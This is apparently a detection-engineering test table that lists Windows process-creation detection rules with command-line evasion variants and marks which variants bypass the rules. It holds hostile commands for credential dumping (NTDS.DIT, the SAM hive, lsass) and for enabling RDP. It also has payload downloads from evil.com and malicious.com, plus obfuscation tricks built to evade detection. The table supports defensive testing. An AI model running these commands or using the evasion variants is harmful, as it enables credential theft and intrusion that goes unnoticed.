Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		esentutl.exe -p C:\temp\ntds.dit	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_cmd_mklink_shadow_copies_access_symlink	VolumeShadowCopy Symlink Creation Via Mklink	40b19fa6-d835-400c-b301-41f3a2baacaf		"cmd.exe /c ""m^kli^n^k /D C:\temp\vss \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"""	FALSE	FALSE	FALSE	
t1003.003	proc_creation_win_cmd_mklink_shadow_copies_access_symlink	VolumeShadowCopy Symlink Creation Via Mklink	40b19fa6-d835-400c-b301-41f3a2baacaf		"cmd.exe /c ""set part1=HarddiskVolume && set part2=ShadowCopy && call mklink /D C:\temp\vss \\?\GLOBALROOT\Device\%part1%%part2%1"""	FALSE	FALSE	FALSE	
t1003.003	proc_creation_win_esentutl_sensitive_file_copy	Copying Sensitive Files with Credential Data	e7be6119-fc37-43f0-ad4f-1f3f99be2f9f		"cmd.exe /c ""cd C:\Windows\ntds && esentutl.exe ,/y,ntds.dit C:\temp\ntds.bak"""	FALSE	FALSE	FALSE	
t1003.003	proc_creation_win_ntdsutil_susp_usage	Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)	a58353df-af43-4753-bad0-cd83ef35eef5		"echo snapshot ""mount c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb"" quit quit | ntdsutil.exe"	FALSE	FALSE	FALSE	
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08	"cmd.exe /c ""robocopy C:\Windows\NTDS\ C:\exfil\ ntds.dit"""	robocopy C:\Windows\NTDS\ C:\exfil\ ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.005	proc_creation_win_cmdkey_adding_generic_creds	New Generic Credentials Added Via Cmdkey.EXE	b1ec66c6-f4d1-4b5c-96dd-af28ccae7727		"cmdkey.exe ""/generic:10.10.10.10"" ""/user:Administrator"" ""/pass:P@ssw0rd123!"""	TRUE	TRUE	TRUE	
t1003.005	proc_creation_win_cmdkey_adding_generic_creds	New Generic Credentials Added Via Cmdkey.EXE	b1ec66c6-f4d1-4b5c-96dd-af28ccae7727		cmdkey.exe /add:10.10.10.10 /user:Administrator /pass:P@ssw0rd123!	TRUE	TRUE	TRUE	
t1003.005	proc_creation_win_cmdkey_recon	Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE	07f8bdc2-c9b3-472a-9817-5a670b872f53		"cmdkey.exe ""/list"""	TRUE	TRUE	TRUE	
t1003.005	proc_creation_win_cmdkey_recon	Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE	07f8bdc2-c9b3-472a-9817-5a670b872f53		cmdkey.exe,/list	TRUE	TRUE	TRUE	
t1003.005	proc_creation_win_reg_dumping_sensitive_hives	Dumping of Sensitive Hives Via Reg.EXE	fd877b94-9bb5-4191-bb25-d79cbd93c167		"reg.exe ""save"" HKLM\SAM C:\temp\sam.save"	TRUE	TRUE	TRUE	
t1003.011	proc_creation_win_hktl_rubeus	HackTool - Rubeus Execution	7ec2c172-dceb-4c10-92c9-87c1881b7e18		"cmd.exe /c ""C:\temp\updater.exe k^erberoast /outfile:hashes.txt"""	FALSE	FALSE	FALSE	
t1003.015	proc_creation_win_hktl_rubeus	HackTool - Rubeus Execution	7ec2c172-dceb-4c10-92c9-87c1881b7e18		copy C:\Tools\Rubeus.exe C:\Windows\Temp\not_malware.exe	TRUE	TRUE	TRUE	
t1003.016	proc_creation_win_iis_appcmd_service_account_password_dumped	Microsoft IIS Service Account Password Dumped	2d3cdeec-c0db-45b4-aa86-082f7eb75701		"%comspec% /c ""set a=li& set b=st& call appcmd.exe %a%%b% config /section:identity"""	FALSE	FALSE	FALSE	
t1003.022	proc_creation_win_reg_open_command	Suspicious Reg Add Open Command	dd3ee8cc-f751-41c9-ba53-5a32ed47e563		reg add HKCU\Software\Classes\ms-settings\shell\opencommand /value=test /validdataentropy=512 /expandtostring	TRUE	TRUE	TRUE	
t1003.024	proc_creation_win_rpcping_credential_capture	Capture Credentials with Rpcping.exe	93671f99-04eb-4ab4-a161-70d446a84003		C:\\Windows\\System32\\rpcping.exe -s 10.0.0.5	TRUE	TRUE	TRUE	
t1003.027	proc_creation_win_sc_query_interesting_services	Interesting Service Enumeration Via Sc.EXE	e83e8899-c9b2-483b-b355-5decc942b959		sc.exe qc termservice	TRUE	TRUE	TRUE	
t1005.003	proc_creation_win_esentutl_webcache	Esentutl Steals Browser Information	6a69f62d-ce75-4b57-8dce-6351eb55b362		"set ""flag=/r"" && esentutl.exe %flag% %LocalAppData%\Microsoft\Windows\WebCache\WebCacheV01.dat"	TRUE	TRUE	TRUE	
t1005.004	proc_creation_win_sqlcmd_veeam_db_recon	Veeam Backup Database Suspicious Query	696bfb54-227e-4602-ac5b-30d9d2053312		"copy ""C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe"" C:\Temp\dbquery.exe && C:\Temp\dbquery.exe -S localhost -d VeeamBackup -Q ""SELECT * FROM Credentials"""	TRUE	TRUE	TRUE	
t1005.007	proc_creation_win_sqlcmd_veeam_dump	VeeamBackup Database Credentials Dump Via Sqlcmd.EXE	b57ba453-b384-4ab9-9f40-1038086b4e53		"copy ""C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe"" C:\Temp\custom_cmd.exe && C:\Temp\custom_cmd.exe -E -S localhost -Q ""SELECT TOP 10 * FROM [VeeamBackup].[dbo].[Credentials]"""	TRUE	TRUE	TRUE	
t1007.001	proc_creation_win_reg_query_registry	Potential Configuration And Service Reconnaissance Via Reg.EXE	970007b7-ce32-49d0-a4a4-fbef016950bd		"cmd.exe /c ""reg.exe q^u^e^r^y HKLM\System\CurrentControlSet\Services"""	FALSE	FALSE	FALSE	
t1007.002	proc_creation_win_reg_query_registry	Potential Configuration And Service Reconnaissance Via Reg.EXE	970007b7-ce32-49d0-a4a4-fbef016950bd		"cmd.exe /c ""set KEY=currentcontrolset\services && call reg.exe query HKLM\System\%KEY%"""	FALSE	FALSE	FALSE	
t1012.007	proc_creation_win_regedit_export_keys	Exports Registry Key To a File	f0e53e89-8d22-46ea-9db5-9d4796ee2f8a		reg.exe export HKCU\Software C:\temp\export.reg	TRUE	TRUE	TRUE	
t1016.002	proc_creation_win_nltest_recon	Potential Recon Activity Via Nltest.EXE	5cc90652-4cbd-4241-aa3b-4b462fa5a248		wmic /namespace:\root\microsoftactivedirectory class Microsoft_DomainTrustStatus get /format:list	FALSE	FALSE	FALSE	
t1018.004	proc_creation_win_python_adidnsdump	PUA - Adidnsdump Execution	26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160		copy C:\Python39\python.exe C:\Temp\runner.exe && C:\Temp\runner.exe -m adidnsdump -u DOMAIN\User -p Password ldap://10.10.10.10	TRUE	TRUE	TRUE	
t1018.005	proc_creation_win_python_adidnsdump	PUA - Adidnsdump Execution	26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160		python.exe my_dns_enum.py -u DOMAIN\User -p Password ldap://10.10.10.10	TRUE	TRUE	TRUE	
t1018.009	proc_creation_win_susp_network_scan_loop	Suspicious Scan Loop Network	f8ad2e2c-40b6-4117-84d7-20b89896ab23		"cmd.exe /c ""f^o^r /L %i in (1,1,254) do p^i^n^g -n 1 192.168.1.%i"""	FALSE	FALSE	FALSE	
t1021.001	proc_creation_win_susp_priv_escalation_via_named_pipe	Privilege Escalation via Named Pipe Impersonation	9bd04a79-dabe-4f1f-a5ff-92430265c96b		cmd.exe /c copy /Y data.txt \\.\pipe\target_pipe	TRUE	TRUE	TRUE	
t1021.001	proc_creation_win_reg_rdp_keys_tamper	Potential Tampering With RDP Related Registry Keys Via Reg.EXE	0d5675be-bc88-4172-86d3-1e96a4476536		"echo Y | reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0"	TRUE	TRUE	TRUE	
t1021.001	proc_creation_win_reg_rdp_keys_tamper	Potential Tampering With RDP Related Registry Keys Via Reg.EXE	0d5675be-bc88-4172-86d3-1e96a4476536		"reg.exe add ""HKLM\SYSTEM\ControlSet001\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"	TRUE	TRUE	TRUE	
t1021.001	proc_creation_win_reg_rdp_keys_tamper	Potential Tampering With RDP Related Registry Keys Via Reg.EXE	0d5675be-bc88-4172-86d3-1e96a4476536		"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0/f"	TRUE	TRUE	TRUE	
t1021.001	proc_creation_win_ssh_port_forward	Port Forwarding Activity Via SSH.EXE	327f48c1-a6db-4eb8-875a-f6981f1b0183		ssh.exe -F ssh_config_with_forwarding.txt user@target	TRUE	TRUE	TRUE	
t1021.002	proc_creation_win_net_use_mount_admin_share	Windows Admin Share Mount Via Net.EXE	3abd6094-7027-475f-9630-8ab9be7b9725		cmd.exe /c pushd \\192.168.1.100\ADMIN$	TRUE	TRUE	TRUE	
t1021.002	proc_creation_win_net_use_mount_share	Windows Share Mount Via Net.EXE	f117933c-980c-4f78-b384-e3d838111165		pushd \\192.168.1.10\share	TRUE	TRUE	TRUE	
t1021.004	proc_creation_win_ssh_port_forward	Port Forwarding Activity Via SSH.EXE	327f48c1-a6db-4eb8-875a-f6981f1b0183		"ssh.exe -o ""RemoteForward 8080 localhost:80"" user@10.10.10.10"	TRUE	TRUE	TRUE	
t1021.004	proc_creation_win_ssh_port_forward	Port Forwarding Activity Via SSH.EXE	327f48c1-a6db-4eb8-875a-f6981f1b0183		ssh.exe -R8080:localhost:80 user@10.10.10.10	TRUE	TRUE	TRUE	
t1021.006	proc_creation_win_hktl_evil_winrm	HackTool - WinRM Access Via Evil-WinRM	a197e378-d31b-41c0-9635-cfdf1c1bb423		copy C:\Ruby30-x64\bin\ruby.exe C:\temp\updater.exe && C:\temp\updater.exe evil-winrm.rb -i 10.0.0.5 -u Administrator -p Password123	TRUE	TRUE	FALSE	Weak or Abused Passwords In CLI (91edcfb1-2529-4ac2-9ecc-7617f895c7e4)
t1027.001	proc_creation_win_certutil_decode	File Decoded From Base64/Hex Via Certutil.EXE	cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7		"certutil.exe ""-decode"" input.b64 output.exe"	TRUE	TRUE	TRUE	
t1027.002	proc_creation_win_certutil_decode	File Decoded From Base64/Hex Via Certutil.EXE	cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7		"certutil.exe -decode	input.b64 output.exe"	TRUE	TRUE	TRUE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Temp\payload.exe C:\Temp\payload.cs	TRUE	TRUE	TRUE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Tasks\update.exe C:\Windows\Tasks\update.cs	TRUE	TRUE	TRUE	
t1027.005	proc_creation_win_pua_rcedit_execution	PUA - Potential PE Metadata Tamper Using Rcedit	0c92f2e6-f08f-4b73-9216-ecb0ca634689		"copy rcedit-x64.exe r.exe && .\r.exe target.exe --set-version-string ""Original""""FileName"" ""svchost.exe"""	TRUE	TRUE	TRUE	
t1027.005	proc_creation_win_pua_rcedit_execution	PUA - Potential PE Metadata Tamper Using Rcedit	0c92f2e6-f08f-4b73-9216-ecb0ca634689		"ren rcedit-x64.exe not_rcedit.exe && .\not_rcedit.exe target.exe --set-version-string ""OriginalFileName"" ""lsass.exe"""	TRUE	TRUE	TRUE	
t1027.012	proc_creation_win_certutil_encode	File Encoded To Base64 Via Certutil.EXE	e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a		copy certutil.exe totallynotcertutil.exe & totallynotcertutil.exe -encode input.txt output.txt	FALSE	FALSE	FALSE	
t1027.018	proc_creation_win_certutil_export_pfx	Certificate Exported Via Certutil.EXE	3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5		"certutil.exe ""-exportPFX"" LocalMachine C:\temp\cert.pfx"	TRUE	TRUE	TRUE	
t1027.019	proc_creation_win_certutil_export_pfx	Certificate Exported Via Certutil.EXE	3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5		"certutil.exe -exportPFX	CurrentUser	C:\temp\cert.pfx"	FALSE	FALSE	FALSE	
t1027.029	proc_creation_win_hktl_invoke_obfuscation_via_stdin	Invoke-Obfuscation Via Stdin	9c14c9fa-1a63-4a64-8e57-d19280559490		"cmd.exe /V:ON /C ""set a=in&& set b=voke&& set c=!a!!b!&& echo !c! | powershell -"""	FALSE	FALSE	FALSE	
t1027.030	proc_creation_win_hktl_invoke_obfuscation_via_use_clip	Invoke-Obfuscation Via Use Clip	e1561947-b4e3-4a74-9bdd-83baed21bdb5		"cmd.exe /c ""echo Write-Host 'Test' | c^l^i^p.exe && powershell -c \""IEX ([System.Windows.Forms.Clipboard]::GetText())\"""""	TRUE	TRUE	TRUE	
t1027.031	proc_creation_win_hktl_invoke_obfuscation_via_use_clip	Invoke-Obfuscation Via Use Clip	e1561947-b4e3-4a74-9bdd-83baed21bdb5		"cmd.exe /c ""echo Write-Host 'Test' | clip & powershell -c \""IEX ([System.Windows.Forms.Clipboard]::GetText())\"""""	TRUE	TRUE	TRUE	
t1027.036	proc_creation_win_hktl_invoke_obfuscation_via_var	Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION	e9f55347-2928-4c06-88e5-1a7f8169942e		"cmd.exe /c ""set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \""{1}{0}\"" -f 'st','Te' & %LAUNCH%"""	FALSE	FALSE	FALSE	
t1027.037	proc_creation_win_hktl_invoke_obfuscation_via_var	Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION	e9f55347-2928-4c06-88e5-1a7f8169942e		"cmd.exe /c ""set VAR=Invoke-Expression 'Write-Host Safe' &&set RUN=powershell.exe -c ('Te'+'st') && %RUN%"""	FALSE	FALSE	FALSE	
t1027.039	proc_creation_win_ping_hex_ip	Ping Hex IP	1a0d4aba-7668-4365-9ce4-6d79ab088dfd		ping 0177.0000.0000.0001	TRUE	TRUE	TRUE	
t1027.040	proc_creation_win_ping_hex_ip	Ping Hex IP	1a0d4aba-7668-4365-9ce4-6d79ab088dfd		ping 2130706433	TRUE	TRUE	FALSE	Obfuscated IP Via CLI (56d19cb4-6414-4769-9644-1ed35ffbb148)
t1027.077	proc_creation_win_susp_system_user_anomaly	Suspicious SYSTEM User Process Creation	2617e7ed-adb7-40ba-b0f3-8f9945fe6c09		certutil.exe -f -split -f http://malicious.com/payload.exe C:\Windows\Temp\payload.exe	TRUE	TRUE	TRUE	
t1033.002	proc_creation_win_hktl_sharpview	HackTool - SharpView Execution	b2317cfa-4a47-4ead-b3ff-297438c0bc2d		"cmd.exe /c ""copy SharpView.exe sv_update.exe & sv_update.exe G^et-Doma^inComputer"""	FALSE	FALSE	FALSE	
t1033.013	proc_creation_win_susp_local_system_owner_account_discovery	Local Accounts Discovery	502b42de-4306-40b4-9596-6f590c81f073		wmic useraccount list brief	FALSE	FALSE	FALSE	
t1033.015	proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb		"cmd.exe /c ""& ipconfig & echo"""	FALSE	FALSE	FALSE	
t1033.016	proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb		"cmd.exe /c ""&dir&&echo [E]"""	FALSE	FALSE	FALSE	
t1036.003	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede		"bitsadmin.exe	/transfer	myJob	http://evil.com/payload.exe	C:\temp\payload.exe"	TRUE	TRUE	TRUE	
t1036.003	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		C:\Windows\System32\cmd.exe /c start remote.exe -arg1 -arg2	TRUE	TRUE	TRUE	
t1036.014	proc_creation_win_dumpminitool_susp_execution	Suspicious DumpMinitool Execution	eb1c4225-1c23-4241-8dd4-051389fde4ce		mkdir C:\Temp\Extensions\ && copy DumpMinitool.exe C:\Temp\Extensions\DumpMinitool.exe && C:\Temp\Extensions\DumpMinitool.exe --file C:\Temp\memory.dmp --processId 752 --dumpType Full	TRUE	TRUE	TRUE	
t1036.015	proc_creation_win_explorer_break_process_tree	Explorer Process Tree Break	949f1ffb-6e85-4f00-ae1e-c3c5b190d605		"explorer.exe ""/root,C:\Windows\System32\calc.exe"""	TRUE	TRUE	TRUE	
t1036.016	proc_creation_win_explorer_break_process_tree	Explorer Process Tree Break	949f1ffb-6e85-4f00-ae1e-c3c5b190d605		explorer.exe,/root,C:\Windows\System32\calc.exe	TRUE	TRUE	TRUE	
t1036.022	proc_creation_win_hktl_xordump	HackTool - XORDump Execution	66e563f9-1cbd-4a22-a957-d8b7c0f44372		"cmd.exe /c ""C:\temp\update_service.exe -p^rocess lsass.exe -m c^omsvcs"""	FALSE	FALSE	FALSE	
t1036.026	proc_creation_win_renamed_createdump	Renamed CreateDump Utility Execution	1a1ed54a-2ba4-4221-94d5-01dee560d71e		"cmd.exe /c ""malicious_dump.exe --full --name C:\temp\lsass.d^mp 756"""	FALSE	FALSE	FALSE	
t1036.038	proc_creation_win_susp_commandline_path_traversal_evasion	Potential Command Line Path Traversal Evasion Attempt	1327381e-6ab0-4f38-b583-4c1b8346a56b		"C:\Windows\System32\cmd.exe /c ""C:\Windows/../Windows/System32/calc.exe"""	FALSE	FALSE	FALSE	
t1036.039	proc_creation_win_susp_commandline_path_traversal_evasion	Potential Command Line Path Traversal Evasion Attempt	1327381e-6ab0-4f38-b583-4c1b8346a56b		"cmd.exe /c ""set UP=..&& call C:\Windows\%UP%\Windows\System32\calc.exe"""	FALSE	FALSE	FALSE	
t1036.044	proc_creation_win_sysinternals_procdump_evasion	Potential SysInternals ProcDump Evasion	79b06761-465f-4f88-9ef2-150e24d3d737		robocopy C:\Sysinternals C:\temp procdump.exe	TRUE	TRUE	TRUE	
t1036.045	proc_creation_win_sysinternals_procdump_evasion	Potential SysInternals ProcDump Evasion	79b06761-465f-4f88-9ef2-150e24d3d737		cmd.exe /c ren procdump.exe pd.exe	TRUE	TRUE	TRUE	
t1036.055	proc_creation_win_werfault_reflect_debugger_exec	Potential ReflectDebugger Content Execution Via WerFault.EXE	fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd		C:\Windows\System32\WerFault.exe -prC:\Windows\System32\notepad.exe	TRUE	TRUE	TRUE	
t1037.001	proc_creation_win_userinit_uncommon_child_processes	Uncommon Userinit Child Process	0a98a10c-685d-4ab0-bddc-b6bdd1d48458		C:\Windows\System32\cmd.exe /c echo hello	TRUE	TRUE	TRUE	
t1040.001	proc_creation_win_netsh_packet_capture	New Network Trace Capture Started Via Netsh.EXE	d3c3861d-c504-4c77-ba55-224ba82d0118		netsh tr st capture=yes	TRUE	TRUE	TRUE	
t1040.002	proc_creation_win_netsh_wifi_credential_harvesting	Harvesting Of Wifi Credentials Via Netsh.EXE	42b1a5b8-353f-4f10-b256-39de4467faff		"cmd.exe /c ""echo wlan show profile name=SSID key=clear | netsh.exe"""	FALSE	FALSE	FALSE	
t1046.001	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		C:\Windows\System32\rundll32.exe C:\Windows\Temp\legit.dll,#1	TRUE	TRUE	TRUE	
t1046.003	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		"cmd.exe /c ""W^in^P^wn.exe"""	FALSE	FALSE	FALSE	
t1046.005	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		"C:\Windows\System32\cmd.exe /c start """" ""C:\Users\Public\WP.exe"""	TRUE	TRUE	TRUE	
t1046.008	proc_creation_win_pua_advanced_ip_scanner	PUA - Advanced IP Scanner Execution	bef37fa2-f205-4a7b-b484-0759bfd5f86f		"cmd.exe /c ""copy C:\Tools\advanced_ip_scanner.exe C:\Temp\audit.exe & C:\Temp\audit.exe"""	FALSE	FALSE	FALSE	
t1047.002	proc_creation_win_hh_susp_execution	Suspicious HH.EXE Execution	e8a95b5e-c891-46e2-b33a-93937d3abc31		"cmd.exe /c ""cd C:\Users\Public\Downloads && hh.exe payload.chm"""	FALSE	FALSE	FALSE	
t1047.005	proc_creation_win_hh_susp_execution	Suspicious HH.EXE Execution	e8a95b5e-c891-46e2-b33a-93937d3abc31		"cmd.exe /c ""cd C:\Users\Victim\Downloads\ && hh.exe payload.chm"""	FALSE	FALSE	FALSE	
t1047.056	proc_creation_win_wmic_uninstall_application	Application Removed Via Wmic.EXE	b53317a0-8acf-4fd1-8de8-a5401e776b96		taskkill /f /im explorer.exe && timeout /t 5 && start explorer.exe	TRUE	TRUE	TRUE	
t1049.002	proc_creation_win_net_use_network_connections_discovery	System Network Connections Discovery Via Net.EXE	1c67a717-32ba-409b-a45d-0fb704a73a81		"cmd.exe /c ""net.exe u^s^e"""	FALSE	FALSE	FALSE	
t1049.003	proc_creation_win_net_use_network_connections_discovery	System Network Connections Discovery Via Net.EXE	1c67a717-32ba-409b-a45d-0fb704a73a81		"net.exe ""use"""	TRUE	TRUE	TRUE	
t1053.005	proc_creation_win_schtasks_change	Suspicious Modification Of Scheduled Tasks	1c0e41cd-21bb-4433-9acc-4a2cd6367b9b		"schtasks.exe /Change /TN ""UpdateTask"" /TR ""C:\Windows\System32\notepad.exe"""	TRUE	TRUE	TRUE	
t1053.005	proc_creation_win_schtasks_schedule_via_masqueraded_xml_file	Suspicious Scheduled Task Creation via Masqueraded XML File	dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c		"schtasks.exe -create -tn ""SuspiciousTask2"" -xml ""C:\public\payload.bin"" -f   # ignored_comment.xml"	TRUE	TRUE	TRUE	
t1059.001	proc_creation_win_hh_susp_execution	Suspicious HH.EXE Execution	e8a95b5e-c891-46e2-b33a-93937d3abc31		"cmd.exe /c ""copy C:\Windows\hh.exe C:\ProgramData\not_hh.exe && C:\ProgramData\not_hh.exe C:\Users\%USERNAME%\Documents\payload.chm"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_hktl_bloodhound_sharphound	HackTool - Bloodhound/Sharphound Execution	f376c8a7-a2d0-4ddc-aa0c-16c17236d962		"copy SharpHound.exe not_suspicious.exe; .\not_suspicious.exe --collectionmethods=""All"" --domain ""contoso.local"""	TRUE	TRUE	TRUE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"cmd.exe /c ""type C:\Users\Public\script.ps1 | powershell.exe -noprofile -"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_schtasks_appdata_local_system	Suspicious Schtasks Execution AppData Folder	c5c00f49-b3f9-45a6-997e-cfdecc6e1967		"cmd.exe /c ""cd C:\Users\Public\..\Admin\AppData\Local && schtasks /Create /TN ""UpdateTask"" /TR ""payload.exe"" /SC ONSTART /RU SYSTEM"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_webdav_lnk_execution	Potentially Suspicious WebDAV LNK Execution	1412aa78-a24c-4abd-83df-767dfb2c5bbe		"cmd.exe /v:on /c ""set root=DavWWWRoot&& \\192.168.1.10@80\!root!\payload.bat"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_webdav_lnk_execution	Potentially Suspicious WebDAV LNK Execution	1412aa78-a24c-4abd-83df-767dfb2c5bbe		cmd.exe /c start \\192.168.1.50@80\share\payload.lnk	TRUE	TRUE	TRUE	
t1059.002	proc_creation_win_cmd_dosfuscation	Potential Dosfuscation Activity	a77c1610-fc73-4019-8e29-0f51efc04a51		"cmd.exe /c ""FOR /F ""tokens=1"" %A IN ('echo set') DO %A MYVAR=value"""	TRUE	TRUE	TRUE	
